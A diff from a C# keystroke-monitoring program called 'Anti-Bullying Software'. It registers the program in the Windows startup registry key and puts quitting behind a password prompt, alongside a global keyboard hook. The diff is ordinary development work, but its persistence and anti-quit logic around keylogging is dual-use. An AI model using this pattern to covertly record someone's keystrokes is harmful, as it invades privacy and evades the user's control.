@@ -44,8 +44,7 @@ namespace KeyTrackerBase
 
         public Form1()
         {
-            //run on startup
-            rkApp.SetValue("Anti-Bullying Software", Path.GetDirectoryName(Application.ExecutablePath));
+           
 
             if (settings == null || settings.Length == 0)
             {
@@ -92,6 +91,8 @@ namespace KeyTrackerBase
                 Application.Exit();
             }
 
+            //run on startup
+            rkApp.SetValue("Anti-Bullying Software", "\"" + Application.ExecutablePath + "\"");
             InitializeComponent();
             #endregion
 
@@ -172,6 +173,7 @@ namespace KeyTrackerBase
         //opens settings form on click in menu
         void settingsItem_Click(object sender, EventArgs e)
         {
+            Properties.Settings.Default.passwordDetermine = "settings";
             Password passwordForm = new Password();
             passwordForm.Show();
         }
@@ -179,7 +181,9 @@ namespace KeyTrackerBase
         //quits the program
         public void quitMenuItem_Click(object sender, EventArgs e)
         {
-            this.Close();
+            Properties.Settings.Default.passwordDetermine = "quit";
+            Password passwordForm = new Password();
+            passwordForm.Show();
         }
 
         //new instance of glabal key hook
